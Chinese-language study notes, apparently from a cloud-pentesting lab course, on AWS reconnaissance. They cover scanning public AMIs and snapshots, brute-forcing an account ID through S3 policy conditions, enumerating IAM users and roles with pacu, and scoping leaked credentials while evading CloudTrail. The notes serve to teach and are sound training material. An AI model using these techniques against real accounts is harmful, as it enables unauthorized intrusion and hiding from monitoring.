@@ -1284,4 +1284,1051 @@ Already-built tool: `cloudbrute` or `cloud-enum`
 ![image](https://hackmd.io/_uploads/r1YZ1ilnkl.png)
 
 ## Reconnaissance via Cloud Service Provider's API
+透過 Cloud Service Provider 的 API 進行 Reconnaissance
+>[!Note]
+>管理 AWS 雲端環境內的使用者及其權限的服務稱為: [Identity and Access Management](https://aws.amazon.com/iam/?nc=sn&loc=1)，也稱為 IAM
+
+- 從公開資源獲取資訊
+例如公開的 S3 Bucket、Lambda 函數、ECR（Elastic Container Registry）映像等。
+- 從公開的 S3 Bucket 中獲取帳戶 ID
+S3 Bucket 的某些資訊可能暴露 AWS 帳戶 ID。
+- 列舉（Enumerate）其他帳戶的 IAM 使用者
+嘗試識別 目標 AWS 帳戶下的 IAM 使用者，這可能會暴露企業內部的角色、權限、甚至 API 金鑰。
+### Preparing the Lab - Configure AWS CLI
+#### 1. 安裝 AWS CLI
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo apt update
+┌──(chw㉿CHW)-[~]
+└─$ sudo apt install -y awscli
+...
+```
+確認安裝
+```
+aws --version
+```
+#### 2. 配置 AWS CLI
+使用 Lab 提供的 AWS Access Key 和 Secret Access Key 來與 AWS API 互動，使用 AWS CLI 來測試 AWS API 的存取權限\
+設定 AWS profile 並確認憑證有效
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws configure --profile attacker
+AWS Access Key ID [None]: {Access Key Id}
+AWS Secret Access Key [None]: {Access Key Secret}
+Default region name [None]: us-east-1
+Default output format [None]: json
+                                    
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile attacker sts get-caller-identity
+{
+    "UserId": "{Access Key Id}",
+    "Account": "{Account ID}",
+    "Arn": "arn:aws:iam::{Account ID}:user/attacker"
+}
+```
+>`Account`：AWS 帳戶 ID\
+`Arn`：使用者完整的 AWS ARN（Amazon Resource Name）
+
+- 列出攻擊者能存取的 S3 Bucket
+`aws --profile attacker s3 ls`
+- 列舉 IAM 使用者
+`aws --profile attacker iam list-users`
+- 查詢 IAM 權限
+`aws --profile attacker iam get-user`
+
+### Publicly Shared Resources
+透過 AWS API 探索公開共享的雲端資源，特別是 AMIs（[Amazon Machine Images](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/AMIs.html)）、EBS（[Elastic Block Storage](https://aws.amazon.com/ebs/)）snapshots 和 RDS（[Relational Database Service](https://aws.amazon.com/rds/)）snapshots。
+#### 1. 搜尋 AWS 上的公開 AMIs
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile attacker ec2 describe-images --owners amazon --executable-users all
+{
+    "Images": [
+        {
+            "PlatformDetails": "Linux/UNIX",
+            "UsageOperation": "RunInstances",
+            "BlockDeviceMappings": [
+                   ...
+               ],
+            "Description": "EKS Auto Node AMI (variant: neuron, k8s: 1.31)",
+            "EnaSupport": true,
+            "Hypervisor": "xen",
+            "ImageOwnerAlias": "amazon",
+            "Name": "eks-auto-neuron-1.31-x86_64-20241214",
+            "RootDeviceName": "/dev/xvda",
+            "RootDeviceType": "ebs",
+            "SriovNetSupport": "simple",
+            "VirtualizationType": "hvm",
+            "BootMode": "uefi-preferred",
+            "DeprecationTime": "2026-12-14T05:06:13.000Z",
+            "SourceImageId": "ami-0a070504d78aa3105",
+            "SourceImageRegion": "us-west-2",
+            "ImageId": "ami-00eda206fc827fd26",
+            "ImageLocation": "amazon/eks-auto-neuron-1.31-x86_64-20241214",
+            "State": "available",
+            "OwnerId": "992382739861",
+            "CreationDate": "2024-12-14T05:06:13.000Z",
+            "Public": true,
+            "Architecture": "x86_64",
+            "ImageType": "machine"
+...
+
+```
+>`ec2 describe-images`: 列出該帳戶可以讀取的所有圖像
+>`--owners amazon`: 只顯示 AWS 官方 AMI\
+`--executable-users all`: 所有公開 AMI
+>> `ImageId`： AMI 的唯一識別碼，可以用來啟動 EC2 伺服器\
+`Public: true`：代表個 AMI 是公開的\
+`OwnerId`：AMI 的擁有者（AWS 帳戶 ID）
+
+#### 2. 搜尋目標企業（offseclab.io）相關的 AMI
+找出可能屬於 offseclab.io 的 AMI
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile attacker ec2 describe-images --executable-users all --filters "Name=description,Values=*Offseclab*"
+
+{
+    "Images": []
+}
+
+```
+> 可能是因為該企業 沒有在描述欄位中標示 Offseclab
+
+根據 AMI 的名稱（Name）搜尋
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile attacker ec2 describe-images --executable-users all --filters "Name=name,Values=*Offseclab*"
+{
+    "Images": [
+        {
+            "Architecture": "x86_64",
+            "CreationDate": "2023-08-05T19:43:29.000Z",
+            "ImageId": "ami-0854d94958c0a17e6",
+            "ImageLocation": "123456789012/Offseclab Base AMI",
+            "ImageType": "machine",
+            "Public": true,
+            "OwnerId": "123456789012",
+            "PlatformDetails": "Linux/UNIX",
+            "UsageOperation": "RunInstances",
+            "State": "available",
+            "BlockDeviceMappings": [
+                {
+                    "DeviceName": "/dev/xvda",
+                    "Ebs": {
+                        "DeleteOnTermination": true,
+                {
+                    "DeviceName": "/dev/xvda",
+                    "Ebs": {
+                        "DeleteOnTermination": true,
+                        "DeleteOnTermination": true,
+                        "SnapshotId": "snap-098dc18c797e4f255",
+                        "VolumeSize": 8,
+                        "VolumeType": "gp2",
+                        "Encrypted": false
+                    }
+                }
+            ],
+            "EnaSupport": true,
+            "Hypervisor": "xen",
+            "Name": "Offseclab Base AMI",
+            "RootDeviceName": "/dev/xvda"
+            ...
+```
+>`OwnerId: "123456789012"`: 企業的 AWS 帳戶 ID，之後可以用這個帳戶 ID 搜索更多相關資源。
+
+#### 3. 搜尋 AWS 上的公開 EBS snapshots
+EBS（Elastic Block Storage）是一種 雲端虛擬磁碟，可用來存放 EC2 伺服器的資料
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile attacker ec2 describe-snapshots --filters "Name=description,Values=*offseclab*"
+
+{
+    "Snapshots": []
+}
+```
+>沒有發現公開的 EBS snapshots
+
+#### 4. 搜尋 AWS 上的公開 RDS snapshots
+AWS RDS 允許企業 建立資料庫快照，以備份和還原資料庫
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile attacker rds describe-db-snapshots --snapshot-type public
+
+{
+    "DBSnapshots": []
+}
+```
+>沒有找到公開的 RDS 快照
+### Obtaining Account IDs from S3 Buckets
+透過 AWS S3 API 來獲取目標 AWS 帳戶 ID\
+如果無法透過公開的 AWS 資源（如 AMI、EBS snapshot）直接獲得 AWS 帳戶 ID：
+- 如果目標帳戶擁有一個公開可讀的 S3 bucket（例如 `offseclab-assets-public-*`），可以利用 S3 API 來獲取帳戶 ID
+- AWS 帳戶不應該能夠讀取該 S3 bucket 的內部內容，但我們可以濫用 IAM 政策（Policy）的 Condition 限制，來進行 字典攻擊（Brute Force）帳戶 ID。
+
+>[!Tip]
+AWS 帳戶 ID 由 12 位數字組成，例如：`123456789012`\
+可以通過測試不同的第一個數字（0-9）來逐步推測完整的帳戶 ID。
+
+攻擊流程：
+- 尋找公開的 S3 bucket（例如 `offseclab-assets-public-*`）。
+- 建立一個新的 IAM 使用者 enum，該使用者 默認沒有權限。
+- 創建 IAM 政策來限制 enum 使用者的權限，僅當 S3 bucket 的擁有者帳戶 ID 符合條件時才允許存取。
+- 測試不同的帳戶 ID 前綴，當條件正確時，就可以成功讀取 S3 儲存桶的內容。
+- 根據返回結果，逐步確定完整的 AWS 帳戶 ID。
+
+![gif](https://hackmd.io/_uploads/HymHLv-2yg.gif)
+
+#### 1. 找到公開的 S3 bucket
+尋找 公開可讀的 S3 bucket\
+使用 curl 來從 `www.offseclab.io` 網站的圖片 URL 提取 bucket 名稱
+```
+┌──(chw㉿CHW)-[~]
+└─$ curl -s www.offseclab.io | grep -o -P 'offseclab-assets-public-\w{8}'
+offseclab-assets-public-kaykoour
+offseclab-assets-public-kaykoour
+offseclab-assets-public-kaykoour
+offseclab-assets-public-kaykoour
+```
+> 找到了名為 `offseclab-assets-public-kaykoour` 的 S3 bucket
+
+驗證 S3 儲存桶是否可讀:
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile attacker s3 ls offseclab-assets-public-kaykoour
+                           PRE sites/
+```
+> 允許 公開列出內容
+
+#### 2. 建立新 IAM 使用者 `chw`
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile attacker iam create-user --user-name chw 
+{
+    "User": {
+        "Path": "/",
+        "UserName": "chw",
+        "UserId": "AIDAQOMAIGYU4HTPEJ32K",
+        "Arn": "arn:aws:iam::123456789012:user/chw",
+    }
+}
+
+```
+> 該使用者默認沒有任何權限，因此無法存取 S3 bucket
+
+為 chw 使用者建立存取金鑰（Access Key）:
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile attacker iam create-access-key --user-name chw 
+{
+    "AccessKey": {
+        "UserName": "chw",
+        "AccessKeyId": "{Access Key Id}",
+        "Status": "Active",
+        "SecretAccessKey": "{Access Key Secret}",
+    }
+}
+```
+#### 3. 在 AWS CLI 配置 chw 使用者
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws configure --profile chw     
+AWS Access Key ID [None]: {Access Key Id}
+AWS Secret Access Key [None]: {Access Key Secret}
+Default region name [None]: us-east-1
+Default output format [None]: json
+                                                                                                
+┌──(chw㉿CHW)-[~]
+└─$ aws sts get-caller-identity --profile enum
+
+The config profile (enum) could not be found
+                                                                                                
+┌──(chw㉿CHW)-[~]
+└─$ aws sts get-caller-identity --profile chw 
+{
+    "UserId": "AIDATPFQY6ZPQYTNIGPNK",
+    "Account": "{Account ID}",
+    "Arn": "arn:aws:iam::{Account ID}:user/chw"
+}
+
+```
+測試 chw 使用者的權限:
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile chw s3 ls offseclab-assets-private-kaykoour
+
+
+An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist
+```
+> 證明 chw 目前沒有足夠權限來存取 bucket
+
+![gif](https://hackmd.io/_uploads/r1FnFwbnyg.png)
+#### 4. 創建 IAM policy 來進行帳戶 ID 枚舉
+創建一個 IAM policy（policy-s3-read.json）
+```
+┌──(chw㉿CHW)-[~]
+└─$ cat policy-s3-read.json                                              
+{
+     "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "AllowResourceAccount",
+            "Effect": "Allow",
+            "Action": [
+                "s3:ListBucket",
+                "s3:GetObject"
+            ],
+            "Resource": "*",
+            "Condition": {
+                "StringLike": {"s3:ResourceAccount": ["0*"]}
+            }
+        }
+    ]
+}
+```
+> 當 S3 儲存桶的擁有者帳戶 ID 以 0 開頭時，chw 使用者才被允許存取
+
+附加 IAM policy 給 chw
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile attacker iam put-user-policy \
+--user-name chw \      
+--policy-name s3-read \
+--policy-document file://policy-s3-read.json
+
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile attacker iam list-user-policies --user-name chw 
+{
+    "PolicyNames": [
+        "s3-read"
+    ]
+}
+``` 
+嘗試讀取 S3 bucket
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile enum s3 ls offseclab-assets-private-kaykoour
+
+The config profile (enum) could not be found
+```
+>代表 帳戶 ID 不是以 0 開頭
+
+#### 4. 編輯 IAM policy 測試
+修改 policy-s3-read.json，將條件改成 1*：\
+`"StringLike": {"s3:ResourceAccount": ["1*"]}`\
+重新附加到 chw:
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile attacker iam put-user-policy \
+--user-name chw \      
+--policy-name s3-read \
+--policy-document file://policy-s3-read.json
+```
+>若 `1*` 成功了
+
+持續測試下一個位元
+```
+- __"StringLike": {"s3:ResourceAccount": ["10*"]}__
+- __"StringLike": {"s3:ResourceAccount": ["11*"]}__
+...
+- __"StringLike": {"s3:ResourceAccount": ["18*"]}__
+- __"StringLike": {"s3:ResourceAccount": ["19*"]}__
+```
+### Enumerating IAM Users in Other Accounts
+透過 AWS API 濫用 IAM 設定來 enumerate 目標 AWS 帳戶內的 IAM 使用者與角色\
+可以透過 建立 S3 Bucket 授權策略 或 濫用 AssumeRole 設定 測試是否存在特定 IAM 使用者或角色
+- 利用 AWS API 濫用 IAM 設定，檢測某個 AWS 帳戶內的 IAM 使用者與角色是否存在。
+- 測試 IAM 使用者是否存在的方法：
+    - 建立 S3 Bucket，並嘗試對目標帳戶內的特定 IAM 使用者授權。
+    - 如果授權成功，代表該 IAM 使用者存在；如果失敗，則代表使用者不存在。
+- 測試 IAM 角色是否存在的方法：
+    - 利用 AssumeRole API 來測試特定角色是否存在。
+    - 如果 API 回應錯誤，表示該角色不存在。
+
+#### 1. IAM 設定與 Principal 欄位
+在 AWS 中，當設定 IAM 權限時，可以透過 Principal 屬性來定義哪些 AWS 帳戶或 IAM 身份（使用者/角色）能夠存取該資源
+```
+"Principal": {
+  "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]
+}
+```
+> `AccountID`: AWS 帳戶 ID，例如 123456789012\
+`user/cloudadmin`: IAM 使用者名稱 cloudadmin
+
+#### 2. 列舉 IAM 使用者
+##### 2.1 創建一個新的 S3 bucket
+在 attacker user 的 AWS 帳戶 中創建一個 S3 bucket
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile attacker s3 mb s3://offseclab-dummy-bucket-$RANDOM-$RANDOM-$RANDOM
+
+make_bucket: offseclab-dummy-bucket-3319-18105-13817
+```
+>`offseclab-dummy-bucket-3319-18105-13817`
+
+##### 2.2 設定 S3 授權策略
+設定 一個 S3 IAM Policy，授權特定 AWS 帳戶內的 IAM 使用者讀取該 S3 Bucket
+建立 `grant-s3-bucket-read.json`:
+```
+┌──(chw㉿CHW)-[~]
+└─$ cat grant-s3-bucket-read.json 
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "AllowUserToListBucket",
+            "Effect": "Allow",
+            "Resource": "arn:aws:s3:::offseclab-dummy-bucket-3319-18105-13817",
+            "Principal": {
+                "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]
+            },
+            "Action": "s3:ListBucket"
+
+        }
+    ]
+}
+```
+> 如果 cloudadmin 使用者存在，該策略將能夠成功應用到 S3 Bucket；如果該使用者 不存在，AWS 會返回錯誤訊息
+
+##### 2.3 套用 S3 IAM 授權策略
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile attacker s3api put-bucket-policy \
+    --bucket offseclab-dummy-bucket-3319-18105-13817 \ 
+    --policy file://grant-s3-bucket-read.json
+
+An error occurred (MalformedPolicy) when calling the PutBucketPolicy operation: Invalid principal in policy
+```
+> error: 代表不存在 cloudadmin
+
+透過 自動化測試不同的 IAM 使用者名稱，可以逐步確認 目標帳戶內存在哪些 IAM 使用者
+
+#### 3. 列舉 IAM 角色
+##### 3.1  建立可能的 IAM 角色名稱清單
+```
+┌──(chw㉿CHW)-[~]
+└─$ echo -n "lab_admin
+security_auditor
+content_creator
+student_access
+lab_builder
+instructor
+network_config
+monitoring_logging
+backup_restore
+content_editor" > /tmp/role-names.txt
+```
+##### 3.2 使用 pacu 工具自動化測試
+- 安裝 pacu
+```
+sudo apt update
+sudo apt install pacu
+```
+- 啟動 pacu
+```
+┌──(chw㉿CHW)-[~]
+└─$ pacu               
+No database found at /home/chw/.local/share/pacu/sqlite.db
+Database created at /home/chw/.local/share/pacu/sqlite.db
+
+
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡿⠛⠉⠁⠀⠀⠈⠙⠻⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⡿⣿⣿⣷⣦⠀⠀⠀⠀⠀⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣈⣉⣙⣛⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠿⢿⣿⣷⣦⣄⠀⠀⠈⠛⠋⠀⠀⠀⠈⠻⣿⣷⠀⠀⠀⠀⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣈⣉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⣀⣀⣤⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣆⠀⠀⠀⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣬⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢛⣉⣉⣡⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣶⣄⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣁⣤⣶⡿⣿⣿⠉⠻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢻⣿⣧⡀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣠⣶⣿⡟⠻⣿⠃⠈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣧
+ ⢀⣀⣤⣴⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⢠⣾⣿⠉⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
+ ⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡟
+ ⠀⠀⠀⠀⠉⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁
+ ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⣴⣆⢀⣴⣆⠀⣼⣆⠀⠀⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⠿⠋⠀⠀
+ ⠀⠀⠀⣼⣿⣿⣿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠓⠒⠒⠚⠛⠛⠛⠛⠛⠛⠛⠛⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⠟⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣶⡀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣷⡄⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⣆⠀⢰⣿⣿⣿⠀⠀⠀⣿⣿⣿
+ ⠀⠀⠀⠘⠁⠀⠀⠀⢸⣿⣿⡿⠛⠛⢻⣿⣿⡇⠀⢸⣿⣿⡿⠛⠛⢿⣿⣿⡇⠀⢸⣿⣿⡿⠛⠛⢻⣿⣿⣿⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠸⠿⠿⠟⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣧⣤⣤⣼⣿⣿⡇⠀⢸⣿⣿⣧⣤⣤⣼⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢀⣀⣀⣀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠉⠉⠉⠉⠀⠀⠀⢸⣿⣿⡏⠉⠉⢹⣿⣿⡇⠀⢸⣿⣿⣇⣀⣀⣸⣿⣿⣿⠀⢸⣿⣿⣿⣀⣀⣀⣿⣿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠘⠛⠛⠃⠀⠀⠉⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀⠀⠙⠛⠛⠛⠛⠛⠉⠀
+
+Version: 1.6.0
+What would you like to name this new session? offseclab
+Session offseclab created.
+```
+會要求設定一個 新的測試 Session（例如 offseclab）
+- 匯入 AWS 憑證
+```
+Pacu (offseclab:No Keys Set) > import_keys attacker
+  Imported keys as "imported-attacker"
+```
+- 列舉 IAM 角色
+```
+Pacu (offseclab:imported-attacker) > run iam__enum_roles --word-list /tmp/role-names.txt --account-id {Account ID}
+...
+[iam__enum_roles]   Successfully assumed role for 1 hour: arn:aws:iam::{Account ID}:role/lab_admin
+
+[iam__enum_roles] {
+  "Credentials": {
+    ...
+}
+Cleaning up the PacuIamEnumRoles-jxtnE role.
+...
+
+```
+> 代表該帳戶存在 lab_admin 角色; 如果回傳錯誤，則代表該角色 不存在
+
+## Initial IAM Reconnaissance
+初始 IAM 偵察（Initial IAM Reconnaissance），也就是當成功獲取 AWS 憑證（Access Keys）後，如何 評估這些憑證的權限範圍
+- 確認這組憑證是否有效。
+- 分析憑證的權限範圍，確保在不觸發警報的情況下最大化利用它。
+- 評估可以進行的進一步攻擊：
+    - 列舉更多 IAM 使用者或角色？
+    - 有權限存取 S3 bucket？
+    - 可以建立新的 EC2 執行個體？
+    - 提權（Privilege Escalation）？
+
+## Accessing the Lab
+設定 AWS CLI 來模擬攻擊者使用已洩露的 AWS 憑證\
+Lab 環境中，提供了 三組不同的 AWS 憑證，每組用戶有不同的角色與權限：
+
+>Target 使用者:	🟥 模擬攻擊者獲得的 AWS 憑證，這是主要用來測試的帳戶\
+Challenge 使用者:	🟨 一個權限受限的用戶，用來測試某些概念和額外的練習\
+Monitor 使用者:	🟩 擁有 CloudTrail 記錄存取權限，用來監控 AWS 活動記錄
+
+1. 設定 AWS CLI 使用 Target 帳戶
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws configure --profile target
+
+AWS Access Key ID [None]: {Target ACCESS KEY ID}
+AWS Secret Access Key [None]: {Target ACCESS KEY SECRET}
+Default region name [None]: us-east-1
+Default output format [None]: json
+
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target sts get-caller-identity
+```
+2. 設定 AWS CLI 使用 Challenge 帳戶 
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws configure --profile challenge
+AWS Access Key ID [None]: {Challenge ACCESS KEY ID}
+AWS Secret Access Key [None]: {Challenge ACCESS KEY SECRET}
+Default region name [None]: us-east-1
+Default output format [None]: json
+
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile challenge sts get-caller-identity
+```
+3. 設定 Monitor 帳戶
+登入 AWS 管理控制台
+- 輸入 Monitor Username 和 Password 進行登入。
+- 進入 CloudTrail 記錄，監控 AWS 內部的 API 請求。
+
+![gif](https://hackmd.io/_uploads/BJuc5_W2ke.gif)
+
+
+### Examining Compromised Credentials
+檢查已洩露的 AWS 憑證，確認權限範圍，並嘗試以低可見度的方式進行偵查，避免被 AWS 監控系統（如 CloudTrail）發現
+- 確認憑證是否有效（是否仍能存取 AWS 環境）。
+- 檢查該憑證所屬的 AWS 帳戶 ID、使用者名稱和 IAM 角色。
+- 測試該憑證的權限範圍，找出可以執行的動作。
+- 使用不易被發現的方法來收集資訊，避免觸發 AWS 監控警報（CloudTrail Logs）
+
+#### 1. 使用更隱蔽的方法獲取 AWS 帳戶資訊
+##### [Way 1] 使用 iam get-access-key-info
+如果想要避免被 CloudTrail 記錄，他們可以用另一組 AWS 帳戶來查詢 Access Key ID 所屬的 AWS 帳戶
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile challenge sts get-access-key-info --access-key-id AKIAQOMAIGYUVEHJ7WXM
+{
+    "Account": "123456789012"
+}
+```
+> 從外部 AWS 帳戶查詢帳戶 ID，不會在目標帳戶的 CloudTrail 中留下記錄
+
+##### [Way 2] 觸發 AccessDenied 錯誤來獲取資訊
+嘗試執行 不存在的 Lambda 函數，AWS 會回應錯誤訊息，但其中包含了帳戶 ID 和 IAM 使用者資訊
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function outfile
+
+An error occurred (AccessDeniedException) when calling the Invoke operation: User: arn:aws:iam::{Account ID}:user/support/clouddesk-plove is not authorized to perform: lambda:InvokeFunction on resource: arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function because no resource-based policy allows the lambda:InvokeFunction action
+```
+> 獲取 AWS 帳戶 ID（`123456789012`）\
+獲取 IAM 使用者名稱（`clouddesk-plove`）\
+這類錯誤訊息不會被 CloudTrail 預設記錄
+
+#### 2. 使用不同 Region 來降低偵測風險
+測試在不同區域執行
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target sts get-caller-identity --region us-east-2
+```
+
+#### 3. 從 CloudTrail 驗證攻擊行為
+- 登入 AWS 控制台 並使用 Monitor 使用者 進入 CloudTrail 服務。
+- 檢查 GetCallerIdentity 事件，查看是否有來自 us-east-2（或其他區域）的可疑請求。
+
+![gif](https://hackmd.io/_uploads/Sy2t3u-n1l.gif)
+
+>如果管理員只監控 us-east-1，可能不會注意到 us-east-2 內的可疑行為，這正是試圖利用的漏洞。
+
+### Scoping IAM permissions
+確認已洩露 AWS 憑證的權限範圍，並透過 AWS IAM 設定查找目標帳戶的權限
+#### 1. 列出被洩露帳戶的基本資訊
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target sts get-caller-identity
+
+{
+    "UserId": "AIDAWZJ7PTI575M3SJ553",
+    "Account": "{Account ID}",
+    "Arn": "arn:aws:iam::{Account ID}:user/support/clouddesk-plove"
+}
+```
+> AWS 帳戶 ID `{Account ID}`\
+IAM 使用者名稱為 `clouddesk-plove`\
+使用者的 IAM 路徑為 `/support/`
+
+#### 2. 檢查該帳戶的 IAM 權限
+列出該使用者的 Inline Policy 與 Managed Policy
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam list-user-policies --user-name clouddesk-plove
+
+{
+    "PolicyNames": []
+}
+      
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam list-attached-user-policies --user-name clouddesk-plove
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "deny_challenges_access",
+            "PolicyArn": "arn:aws:iam::{Account ID}:policy/deny_challenges_access"
+        }
+    ]
+}
+
+```
+#### 3. 檢查該使用者是否屬於 IAM 群組
+列出使用者的 IAM 群組
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam list-groups-for-user --user-name clouddesk-plove
+
+{
+    "Groups": [
+        {
+            "Path": "/support/",
+            "GroupName": "support",
+            "GroupId": "{GroupId}",
+            "Arn": "arn:aws:iam::{Account ID}:group/support/support",
+            "CreateDate": "2025-03-14T09:30:05+00:00"
+        }
+    ]
+}
+```
+列出 support 群組的 IAM Policies
+```
+┌──(chw㉿CHW)-[~]
+└─$ aws --profile target iam list-group-policies --group-name support
+
+{
+    "PolicyNames": []
+}
+┌──(chw㉿CHW)-[~]
